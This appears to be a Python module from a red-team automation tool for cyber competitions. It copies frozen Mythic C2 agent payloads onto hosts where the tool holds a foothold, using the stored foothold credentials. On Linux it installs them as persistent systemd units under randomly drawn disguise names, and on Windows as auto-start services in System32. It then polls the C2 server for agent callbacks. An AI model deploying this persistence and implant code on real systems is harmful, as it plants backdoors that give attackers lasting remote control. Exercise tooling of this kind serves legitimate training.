"""Planting the C2 channel on a box, and reading back the evidence.

The engine builds and FREEZES the payload matrix at comp-prep
(`competitions/<id>/red/payloads/` + a `uuid -> box` manifest), because builds
never run mid-event: a lost Mythic state is re-prep, and the payloads are the
artifacts that matter. This module consumes the manifest:

    manifest = {
      "comp": "<id>", "operation": "<mythic operation>",
      "transports": ["http", "webhook"],
      "boxes": {"web01-1": {"uuid": "...", "file": "web01-1.bin",
                            "os": "linux", "agent": "poseidon",
                            "transport": "http"}}}

`Planter.plant()` copies the frozen payload to the box, registers it (systemd
unit on Linux, service + at-logon task on Windows — whichever the payload
supports), verifies the install ON THE BOX, and then asks the operation whether a
callback appeared. The RECORD is written from the install and always; the
callback is evidence about it. That ordering is deliberate — the earlier agent
gated the artifact write on the channel proof and a slow check-in turned a live
plant into a silent absence in both blue's and the organizer's lists.
"""

import json
import time
from pathlib import Path

from ..errors import C2Error
from . import FakeMythic  # noqa: F401  (re-exported convenience for callers)

MANIFEST_REL = Path("red/payloads/manifest.json")


def manifest_path(comp_dir):
    return Path(comp_dir) / MANIFEST_REL


def load_manifest(comp_dir):
    """The frozen payload manifest, or {} when comp-prep has not run."""
    path = manifest_path(comp_dir)
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except ValueError as exc:
        raise C2Error(f"{path} is not valid JSON: {exc}") from exc


def manifest_entry(manifest, box_id, transport=None):
    """The box's frozen payload.

    comp-prep keys the manifest `<box>:<transport>` (a box may carry one payload per
    transport); the caller knows only the box, so fall back to its first entry.
    """
    boxes = (manifest or {}).get("boxes") or {}
    if box_id in boxes:
        return boxes[box_id]
    wanted = f"{box_id}:{transport}" if transport else None
    if wanted and wanted in boxes:
        return boxes[wanted]
    for key, entry in boxes.items():
        if key.split(":", 1)[0] == box_id:
            return entry
    return None


def payload_file(comp_dir, entry):
    if not entry:
        return None
    path = Path(comp_dir) / "red/payloads" / (entry.get("file") or "")
    return path if path.exists() else None


class Planter:
    """Installs frozen payloads. Uses only ctx.ssh + ctx.c2 (+ ctx.world to note)."""

    def __init__(self, ctx, comp_dir=None, manifest=None, now=None):
        self.ctx = ctx
        self.comp_dir = comp_dir or (ctx.cfg["run"].get("comp_dir") or ".")
        self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
        self._now = now or time.time

    # -- install ------------------------------------------------------------

    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=45):
        """Install the frozen payload for `box_id` and report both facts."""
        os_name = os_name or self.ctx.os_of(ip)
        entry = manifest_entry(self.manifest, box_id, transport)
        if entry is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"no manifest entry for {box_id} "
                              "(run comp-prep / `tlaloc c2-prep` first)"}
        local = payload_file(self.comp_dir, entry)
        if local is None:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"payload file for {box_id} is missing from "
                              f"{self.comp_dir}/red/payloads"}
        transport = transport or entry.get("transport") or "http"
        if os_name == "windows":
            installed = self._install_windows(ip, box_id, local, transport)
        else:
            installed = self._install_linux(ip, box_id, local, transport)

        callback_seen = self.wait_for_callback(box_id, wait_sec=wait_sec) \
            if installed.get("ok") else False
        return {**installed, "box": box_id, "os": os_name, "transport": transport,
                "callback_seen": callback_seen, "uuid": entry.get("uuid"),
                "payload": str(local)}

    def _install_linux(self, ip, box_id, local, transport):
        from ..effects import artifactnames as names
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        names_drawn = names.linux_names(self.ctx.world, rng=self.ctx.rng,
                                       mode=names.mode_from_cfg(self.ctx.cfg))
        unit = names_drawn["unit"]
        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
        try:
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  remote, mode=0o755, key_path=fh.get("key_path"))
        except Exception as exc:                       # transport blowups are data
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        unit_text = (
            "[Unit]\n"
            f"Description={names_drawn['unit_desc']}\n"
            "After=network-online.target\n\n"
            "[Service]\n"
            f"ExecStart={remote}\n"
            "Restart=always\nRestartSec=15\n\n"
            "[Install]\nWantedBy=multi-user.target\n")
        script = ("set -e\n"
                  f"cat > /etc/systemd/system/{unit} <<'EOF'\n{unit_text}EOF\n"
                  "systemctl daemon-reload\n"
                  f"systemctl enable --now {unit}\n"
                  f"systemctl is-active {unit}\n")
        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                       script, timeout=120,
                                       key_path=fh.get("key_path"))
        active = (out or "").strip().splitlines()[-1:] == ["active"]
        ok = rc == 0 and active
        return {"ok": ok,
                "detail": (f"{unit} active on {ip} (transport {transport})" if ok
                           else f"unit install rc={rc}: {(err or out).strip()[:200]}"),
                "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
                "check_cmd": f"systemctl is-active {unit}"}

    def _install_windows(self, ip, box_id, local, transport):
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        remote = f"C:\\Windows\\System32\\{box_id}.exe"
        try:
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  "/" + remote.replace("\\", "/"),
                                  key_path=fh.get("key_path"))
        except Exception as exc:
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        script = (
            f"$s = New-Service -Name '{box_id}' -BinaryPathName '{remote}' "
            "-StartupType Automatic -ErrorAction Stop; "
            f"Start-Service -Name '{box_id}' -ErrorAction Stop; "
            f"(Get-Service -Name '{box_id}').Status")
        rc, out, err = self.ctx.ssh.ssh_ps(ip, fh["user"], fh.get("password") or "",
                                           script, timeout=180,
                                           key_path=fh.get("key_path"))
        status = (out or "").strip().splitlines()[-1] if (out or "").strip() else ""
        ok = rc == 0 and status == "Running"
        return {"ok": ok,
                "detail": (f"service {box_id} Running on {ip} (transport {transport})"
                           if ok else
                           f"service install rc={rc}: {(err or out).strip()[:200]}"),
                "unit": box_id, "paths": [remote],
                "check_cmd": f"(Get-Service -Name '{box_id}').Status"}

    # -- evidence -----------------------------------------------------------

    def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
        """Poll the operation for this box's callback inside `wait_sec`.

        A callback is a FRESH row (`c2.callback_max_age_sec`), never the mere
        existence of a row: tavern/mythic keep rows after the agent dies.
        """
        if self.ctx.c2 is None:
            return False
        deadline = self._now() + max(wait_sec, 0)
        while True:
            try:
                record = self.ctx.c2.callbacks().get(box_id)
            except C2Error:
                return False
            if record and self._fresh(record):
                if self.ctx.world is not None and record.get("seen_at"):
                    self.ctx.world.note_callback(box_id, self._iso(record["seen_at"]),
                                                 agent=record.get("agent"),
                                                 external_id=record.get("external_id"))
                return True
            if self._now() >= deadline:
                return False
            time.sleep(poll_interval)

    def _fresh(self, record):
        seen = record.get("seen_at")
        if not seen:
            return False
        if str(record.get("agent") or "").lower() == "none":
            return False
        max_age = float(self.ctx.cfg["c2"].get("callback_max_age_sec", 120))
        return (self._now() - float(seen)) <= max_age

    def _iso(self, epoch):
        return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))
